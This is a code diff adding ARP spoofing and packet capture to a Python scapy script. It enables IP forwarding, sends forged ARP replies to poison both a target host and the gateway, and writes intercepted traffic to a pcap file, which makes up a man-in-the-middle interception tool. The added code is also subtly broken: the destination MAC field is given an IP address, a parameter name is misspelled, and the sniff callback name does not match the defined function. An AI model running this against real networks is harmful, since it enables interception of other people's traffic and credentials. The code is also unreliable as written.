@@ -57,3 +57,28 @@ def clients(arpRes, gatewayRes):
                 clientList.append(item)
     return clientList
 
+# ip forwading
+def allowIpForwading():
+    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
+    subprocess.run(["sysctl", "-p", "/etc/sysctl.conf"])
+    
+def arpSpoofer(targetIp, targetMac, spoofIp):
+    pkt = scapy.ARP(op=2, pdst=targetIp, hwdst=targetIp, psrc=spoofIp)
+    scapy.send(pkt, verbose=False)
+    
+def sendSpoofPackets():
+    while True:
+        arpSpoofer(gatewayInfo["ip"], gatewayInfo["mac"], nodeToSpoof["ip"])
+        arpSpoofer(nodeToSpoof["ip"], nodeToSpoof["mac"], gatewayInfo["ip"])
+        time.sleep(3)
+        
+def packetSniffer(inteface):
+    packets = scapy.sniff(iface = interface, store = False, prn = processSniffedPkt)
+    
+def processSniffedpkt(pkt):
+    print("writing pcap file")
+    scapy.wrpcap("requests.pcap", pkt, append = True)
+    
+def printArpRes(arpRes):
+    print("To Whom Much is Given, Much is expected")
+    
